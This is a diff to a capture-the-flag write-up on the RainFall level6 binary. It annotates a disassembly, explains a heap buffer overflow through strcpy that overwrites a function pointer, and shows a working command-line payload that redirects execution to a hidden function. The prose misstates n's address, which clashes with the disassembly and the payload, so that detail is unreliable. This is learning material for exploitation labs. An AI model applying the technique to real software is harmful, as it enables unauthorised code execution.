@@ -17,10 +17,10 @@ Dump of assembler code for function main:
    0x0804847f <+3>:     and    esp,0xfffffff0
    0x08048482 <+6>:     sub    esp,0x20
    0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
-   0x0804848c <+16>:    call   0x8048350 <malloc@plt>       ; malloc(64)
+   0x0804848c <+16>:    call   0x8048350 <malloc@plt>       ; str = malloc(64)
    0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
    0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
-   0x0804849c <+32>:    call   0x8048350 <malloc@plt>       ; malloc(4)
+   0x0804849c <+32>:    call   0x8048350 <malloc@plt>       ; fptr = malloc(4)
    0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
    0x080484a5 <+41>:    mov    edx,0x8048468
    0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
@@ -32,7 +32,7 @@ Dump of assembler code for function main:
    0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
    0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
    0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
-   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>       ; strcpy()
+   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>       ; strcpy(str, av[1])
    0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
    0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
    0x080484d0 <+84>:    call   eax                          ; call eax where eax point to <m>
@@ -67,7 +67,15 @@ Dump of assembler code for function n:
 End of assembler dump.
 ```
 
+After analysing the differents functions we understand that we need to use the `call eax` instruction at `main<+84>` to make it call the hidden function `n` which will display the `.pass` file.
+
+Since `malloc` will allocate 64 bytes for the string, then 4 more for the address of the function `m` (function pointer), theses two memory spaces will be contiguous.
+
+The use of `strcpy`, which does not check the source string length, to write inside the address returned by the first `malloc`, will allow us to perform a buffer overflow attack on the heap to overwrite the address stored inside the function pointer (`m` address) with the address of `n`.
+
 ## Exploit
+
+The argument we send must be long enough to fill in the 64 bytes allocated by the first `malloc` allocation plus the 8 bytes of block metadata. The 4th next bytes, corresponding to the second `malloc` allocation, must be replaced with the address of `n` function (0x08048468).
 
 ```console
 level6@RainFall:~$ ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
